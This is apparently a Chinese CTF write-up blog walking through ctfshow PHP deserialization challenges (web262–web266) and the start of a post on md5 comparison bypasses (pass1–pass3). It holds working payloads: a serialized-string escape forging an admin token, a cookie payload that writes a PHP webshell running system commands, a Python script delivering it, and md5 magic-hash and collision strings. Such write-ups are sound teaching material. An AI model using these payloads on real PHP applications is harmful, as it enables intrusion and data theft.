<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?f&#x3D;123&amp;m&#x3D;123&amp;t&#x3D;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>然后再访问<code>message.php</code>就可以输入flag</p>
<h3 id="web263"><a class="header-anchor" href="#web263">¶</a>web263</h3>
<p>访问<code>www.zip</code>下载得到源码，观察关键代码<br>
index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	error_reporting(<span class="number">0</span>);</span><br><span class="line">	session_start();</span><br><span class="line">	<span class="comment">//超过5次禁止登陆</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;limit&#x27;</span>]))&#123;</span><br><span class="line">		$_SESSION[<span class="string">&#x27;limti&#x27;</span>]&gt;<span class="number">5</span>?<span class="keyword">die</span>(<span class="string">&quot;登陆失败次数超过限制&quot;</span>):$_SESSION[<span class="string">&#x27;limit&#x27;</span>]=base64_decode($_COOKIE[<span class="string">&#x27;limit&#x27;</span>]);</span><br><span class="line">		$_COOKIE[<span class="string">&#x27;limit&#x27;</span>] = base64_encode(base64_decode($_COOKIE[<span class="string">&#x27;limit&#x27;</span>]) +<span class="number">1</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		 setcookie(<span class="string">&quot;limit&quot;</span>,base64_encode(<span class="string">&#x27;1&#x27;</span>));</span><br><span class="line">		 $_SESSION[<span class="string">&#x27;limit&#x27;</span>]= <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>inc.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $status;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$username,$password</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setStatus</span>(<span class="params">$s</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;status=$s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        file_put_contents(<span class="string">&quot;log-&quot;</span>.<span class="keyword">$this</span>-&gt;username, <span class="string">&quot;使用&quot;</span>.<span class="keyword">$this</span>-&gt;password.<span class="string">&quot;登陆&quot;</span>.(<span class="keyword">$this</span>-&gt;status?<span class="string">&quot;成功&quot;</span>:<span class="string">&quot;失败&quot;</span>).<span class="string">&quot;----&quot;</span>.date_create()-&gt;format(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>显然，<code>cookie</code>中的<code>limit</code>进行base64解码之后传入session中，之后调用<code>inc</code>中的<code>User</code>类，并且其中这个<code>User</code>类中存在文件写入函数，所以写入一句话即可，payload如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username = <span class="string">&#x27;dotast.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $password = <span class="string">&#x27;&lt;?php system(&quot;tac flag.php&quot;);?&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $status=<span class="string">&#x27;dotast&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> User();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="string">&#x27;|&#x27;</span>.serialize($a));</span><br></pre></td></tr></table></figure>
<p>运行后得到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czoxMDoiZG90YXN0LnBocCI7czo4OiJwYXNzd29yZCI7czozMToiPD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKTs&#x2F;PiI7czo2OiJzdGF0dXMiO3M6NjoiZG90YXN0Ijt9</span><br></pre></td></tr></table></figure>
<p>然后存进cookie中，带着cookie去访问<code>index.php</code>，接着访问<code>inc/inc.php</code>，然后就会生成文件<code>log-dotast.php</code>，直接写一个脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/9/2 16:01</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://06573677-b16d-4788-a60d-2f244b945cd1.challenge.ctf.show:8080/&quot;</span></span><br><span class="line">cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;g3us2rlfsn3q3fkahcja154gs8&quot;</span>, <span class="string">&quot;limit&quot;</span>: <span class="string">&quot;fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czoxMDoiZG90YXN0LnBocCI7czo4OiJwYXNzd29yZCI7czozMToiPD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKTs/PiI7czo2OiJzdGF0dXMiO3M6NjoiZG90YXN0Ijt9&quot;</span>&#125;</span><br><span class="line">res1 = requests.get(url + <span class="string">&quot;index.php&quot;</span>, cookies=cookies)</span><br><span class="line"></span><br><span class="line">res2 = requests.get(url + <span class="string">&quot;inc/inc.php&quot;</span>, cookies=cookies)</span><br><span class="line"></span><br><span class="line">res3 = requests.get(url + <span class="string">&quot;log-dotast.php&quot;</span>, cookies=cookies)</span><br><span class="line">print(res3.text)</span><br></pre></td></tr></table></figure>
<p>运行后即可获取flag</p>
<h3 id="web264"><a class="header-anchor" href="#web264">¶</a>web264</h3>
<p>和web262差不多，用之前的payload打，不过访问<code>message.php</code>的时候需要<code>coookie</code>中的<code>msg</code>有值，因为<code>message.php</code>有如下判断</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    $msg = unserialize(base64_decode($_SESSION[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>($msg-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?f&#x3D;123&amp;m&#x3D;123&amp;t&#x3D;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>访问<code>message.php</code><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web264/0D%406H0W%7BX%7DPI%7DW%29SU4CSY_U.png" alt=""></p>
<h3 id="web265"><a class="header-anchor" href="#web265">¶</a>web265</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$t,$p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=$t;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;token===<span class="keyword">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ctfshow = unserialize($_GET[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line">$ctfshow-&gt;token=md5(mt_rand());</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($ctfshow-&gt;login())&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看了一下代码逻辑，很显然，<code>$ctfshow</code>接收传进来的反序列化内容，然后把类中的token赋值为随机数。然后调用<code>login</code>方法，只有<code>token===password</code>才会输出flag；而我们怎么才能定义<code>password</code>的内容等于我们未知的随机数呢？我们可以采用php变量引用的方式</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a =&amp;$b;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意：$a和$b是指向同一个地方，而不是$a指向了$b，亦或$b指向$a</p>
</blockquote>
<p>所以payload为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $token = <span class="string">&quot;dotast&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $password = <span class="string">&quot;dotast&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;token===<span class="keyword">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> ctfshowAdmin();</span><br><span class="line">$a -&gt;token=&amp;$a -&gt;password;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
<h3 id="web266"><a class="header-anchor" href="#web266">¶</a>web266</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">$cs = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $password=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$u,$p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=$u;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="keyword">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $flag;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$ctfshowo=@unserialize($cs);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ctfshow/&#x27;</span>, $cs))&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Error <span class="subst">$ctfshowo</span>&quot;</span>,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这题的话只要绕一个正则就行，绕过了自然在结束的时候触发<code>__destruct</code>魔术方法输出flag。有的同学问这里怎么传参，还不知道的同学该去复习一下文件包含专题啦。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $password=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="keyword">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = serialize(<span class="keyword">new</span> ctfshow());</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br></pre></td></tr></table></figure>
<p>运行后得到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:7:&quot;ctfshow&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;xxxxxx&quot;;s:8:&quot;password&quot;;s:6:&quot;xxxxxx&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p><code>ctfshow</code>随便一个字母改成大写，绕过正则<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web266/Y7FN7LODNQ9CJ%5DE%7DQO7_P%7DC.png" alt=""></p>
<h3 id="web267"><a class="header-anchor" href="#web267">¶</a>web267</h3>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>php-md5类型题目汇总</title>
    <url>/posts/16813/</url>
    <content><![CDATA[<h1>前言</h1>
<p>最近有一些小伙伴遇到md5类型题目求解，所以我打算收集一些相关题目做成一个小靶场分享给各位师傅来玩玩，并且自己动手也是十分有趣的一件事情，如果对各位师傅有用的话在github上给本萌新点一下star哟❤️<br>
靶场地址：<code>https://github.com/dota-st/md5bypass</code><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctf-php%E4%B8%ADmd5%E7%B1%BB%E5%9E%8B%E6%B1%87%E6%80%BB/B%5B%60EVIR%600%28Y0NH_PR%5B%24%284PL.png" alt=""></p>
<h1>writeup</h1>
<h2 id="预备技能"><a class="header-anchor" href="#预备技能">¶</a>预备技能</h2>
<h3 id="弱类型比较"><a class="header-anchor" href="#弱类型比较">¶</a>弱类型比较</h3>
<p>弱类型比较，也叫松散比较。字符串和数字进行比较时，会把字符串强制转换为数字(如果字符串开头有数字，则转换为开头数字，没有则转换为0)</p>
<blockquote>
<p><code>==</code>：只比较数据值——&gt;数据值相同，不比较数据类型<br>
<code>!=</code>:  只比较数据值——&gt;数据值不同</p>
</blockquote>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/ctf-php%E4%B8%ADmd5%E7%B1%BB%E5%9E%8B%E6%B1%87%E6%80%BB/UN%7BOK%25%5BV_%24%7BT%40%24GE2%29TJ~V8.png" alt=""></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var_dump(<span class="number">123</span>==<span class="string">&quot;123a&quot;</span>);</span><br><span class="line"><span class="comment">#bool(true)</span></span><br><span class="line">var_dump(<span class="number">123</span>==<span class="string">&quot;1234a&quot;</span>);</span><br><span class="line"><span class="comment">#bool(false)</span></span><br><span class="line">var_dump(<span class="number">0</span>==<span class="string">&quot;abc&quot;</span>);</span><br><span class="line"><span class="comment">#bool(true)</span></span><br></pre></td></tr></table></figure>
<h3 id="强类型比较"><a class="header-anchor" href="#强类型比较">¶</a>强类型比较</h3>
<p>强类型比较，也叫严格比较。不仅要比较数据的值也要比较数据的类型，例如str和int两种数据类型就不会相等</p>
<blockquote>
<p><code>===</code>：比较数据类型——&gt;数据类型相同  &amp;&amp; 比较数据值——&gt;数据值相同<br>
<code>!==</code>：比较数据类型——&gt;数据类型不同   ||   比较数据值——&gt;数据值不同</p>
</blockquote>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/ctf-php%E4%B8%ADmd5%E7%B1%BB%E5%9E%8B%E6%B1%87%E6%80%BB/%28DMD1IEX62E70~R%606F28BKJ.png" alt=""></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var_dump(<span class="number">123</span>===<span class="string">&quot;123a&quot;</span>);</span><br><span class="line"><span class="comment">#bool(false)</span></span><br><span class="line">var_dump(<span class="number">123</span>===<span class="string">&quot;123&quot;</span>);</span><br><span class="line"><span class="comment">#bool(false)</span></span><br><span class="line">var_dump(<span class="number">123</span>===<span class="number">123</span>);</span><br><span class="line"><span class="comment">#bool(true)</span></span><br></pre></td></tr></table></figure>
<h2 id="pass1"><a class="header-anchor" href="#pass1">¶</a>pass1</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    highlight_file(<span class="string">&quot;pass-01.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&quot;pass&quot;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>($_GET[<span class="string">&quot;pass&quot;</span>] != hash(<span class="string">&quot;md4&quot;</span>, $_GET[<span class="string">&quot;pass&quot;</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;fail~~~&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success!!!&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;flag.txt&#x27;</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;pass-02.php&#x27;&gt;下一关&lt;/a&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;please input the pass&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>考点是md4弱类型，注意观察，if判断中是用的<code>!=</code>也就是弱类型比较，我们可以使用科学计数法0e(需要纯数字)进行绕过，我们写一个脚本得到一个md4加密前和md4加密后都为纯数字的科学计数法表示的字符串</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * User: dota_st</span></span><br><span class="line"><span class="comment"> * Date: 2021/2/5</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; ; $i++) &#123;</span><br><span class="line">    $r = <span class="string">&quot;0e&quot;</span> . $i;</span><br><span class="line">    $md4 = hash(<span class="string">&quot;md4&quot;</span>, $r);</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/^0e[0-9]*$/&quot;</span>, $md4)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md4加密前:&quot;</span>.$r).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;md4加密后：&quot;</span>.$md4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行后得到结果<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctf-php%E4%B8%ADmd5%E7%B1%BB%E5%9E%8B%E6%B1%87%E6%80%BB/pass1/%60N%60KY%5B5%5DID_O_FIS489E1%7DB.png" alt=""></p>
<table>
<thead>
<tr>
<th style="text-align:center">md4加密前</th>
<th style="text-align:center">md4加密后</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">0e251288019</td>
<td style="text-align:center">0e874956163641961271069404332409</td>
</tr>
</tbody>
</table>
<p>成功绕过<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctf-php%E4%B8%ADmd5%E7%B1%BB%E5%9E%8B%E6%B1%87%E6%80%BB/pass1/L1NZO%287J_9%7BFAM6BT9Z%29F%403.png" alt=""></p>
<h2 id="pass2"><a class="header-anchor" href="#pass2">¶</a>pass2</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    highlight_file(<span class="string">&quot;pass-02.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;user&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;pass&#x27;</span>]))&#123;</span><br><span class="line">        $user = $_GET[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">        $pass = $_GET[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($user != $pass &amp;&amp; md5($user) == md5($pass))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success!&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;flag.txt&#x27;</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;pass-03.php&#x27;&gt;下一关&lt;/a&gt;&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;fail~~~&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;please input the user and pass!&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>考点是md5弱类型比较，注意看到<code>==</code>符号，关于md5函数的弱比较，有多种绕过手法</p>
<p><strong>科学计数法绕过</strong><br>
列举几种脚本爆破出的类型</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">IHKFRNS 0e256160682445802696926137988570</span><br><span class="line">QLTHNDT 0e405967825401955372549139051580</span><br><span class="line">QNKCDZO 0e830400451993494058024219903391</span><br><span class="line">3908336290 0e807624498959190415881248245271</span><br><span class="line">4011627063 0e485805687034439905938362701775</span><br><span class="line">4775635065 0e998212089946640967599450361168</span><br><span class="line">0e215962017 0e291242476940776845150308577824</span><br><span class="line">aabg7XSs 0e087386482136013740957780965295</span><br><span class="line">aabC9RqS 0e041022518165728065344349536299</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/ctf-php%E4%B8%ADmd5%E7%B1%BB%E5%9E%8B%E6%B1%87%E6%80%BB/pass2/S%7B~%7DM6%5B5AIR%7BBM%5D%60UMH%7B5%28A.png" alt=""><br>
<strong>数组绕过</strong><br>
php中的md5()函数无法处理数组类型数据，对于数组类型数据返回NULL，当我们传入两个数组时，就会变成两个NULL，也就是NULL==NULL，成功绕过<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctf-php%E4%B8%ADmd5%E7%B1%BB%E5%9E%8B%E6%B1%87%E6%80%BB/pass2/%5B%24E%24YW2%256%25U%29F3NH%60%5D%245AYE.png" alt=""><br>
<strong>md5碰撞</strong></p>
<p>利用md5碰撞，得到两个md5值相同但内容完全不一样的字符串</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">一.%D89%A4%FD%14%EC%0EL%1A%FEG%ED%5B%D0%C0%7D%CAh%16%B4%DFl%08Z%FA%1DA%05i%29%C4%FF%80%11%14%E8jk5%0DK%DAa%FC%2B%DC%9F%95ab%D2%09P%A1%5D%12%3B%1ETZ%AA%92%16y%29%CC%7DV%3A%FF%B8e%7FK%D6%CD%1D%DF&#x2F;a%DE%27%29%EF%08%FC%C0%15%D1%1B%14%C1LYy%B2%F9%88%DF%E2%5B%9E%7D%04c%B1%B0%AFj%1E%7Ch%B0%96%A7%E5U%EBn1q%CA%D0%8B%C7%1BSP</span><br><span class="line"></span><br><span class="line">二.%D89%A4%FD%14%EC%0EL%1A%FEG%ED%5B%D0%C0%7D%CAh%164%DFl%08Z%FA%1DA%05i%29%C4%FF%80%11%14%E8jk5%0DK%DAa%FC%2B%5C%A0%95ab%D2%09P%A1%5D%12%3B%1ET%DA%AA%92%16y%29%CC%7DV%3A%FF%B8e%7FK%D6%CD%1D%DF&#x2F;a%DE%27%29o%08%FC%C0%15%D1%1B%14%C1LYy%B2%F9%88%DF%E2%5B%9E%7D%04c%B1%B0%AFj%9E%7Bh%B0%96%A7%E5U%EBn1q%CA%D0%0B%C7%1BSP</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/ctf-php%E4%B8%ADmd5%E7%B1%BB%E5%9E%8B%E6%B1%87%E6%80%BB/pass2/%5BX4WPN%5DT%24I6D7A4%25S4H8D%5BM.png" alt=""></p>
<h2 id="pass3"><a class="header-anchor" href="#pass3">¶</a>pass3</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    highlight_file(<span class="string">&quot;pass-03.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;user&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;pass&#x27;</span>]))&#123;</span><br><span class="line">        $user = $_GET[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">        $pass = $_GET[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!ctype_alpha($user) &amp;&amp; !is_numeric($pass) &amp;&amp; md5($user) == md5($pass))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success!&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;flag.txt&#x27;</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;pass-04.php&#x27;&gt;下一关&lt;/a&gt;&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;fail~~~&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;please input the user and pass!&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这关还是<code>==</code>进行弱类型比较，但这次多了两个函数</p>
<blockquote>
<p>ctype_alpha()： 用于检测是否只包含[A-Za-z]<br>
is_numeric()：   用于检测变量是否为数字或数字字符串</p>
</blockquote>
<p>我们可以采用科学计数法进行绕过，但一个需要全为数字，一个需要全为字母</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">数字</span><br><span class="line">240610708  0e462097431906509019562988736854</span><br><span class="line">字母</span><br><span class="line">QNKCDZO    0e830400451993494058024219903391</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/ctf-php%E4%B8%ADmd5%E7%B1%BB%E5%9E%8B%E6%B1%87%E6%80%BB/pass3/%28%604%5BRX5%40I98%29%25V_%4038NXR68.png" alt=""></p>
<h2 id="pass4"><a class="header-anchor" href="#pass4">¶</a>pass4</h2>
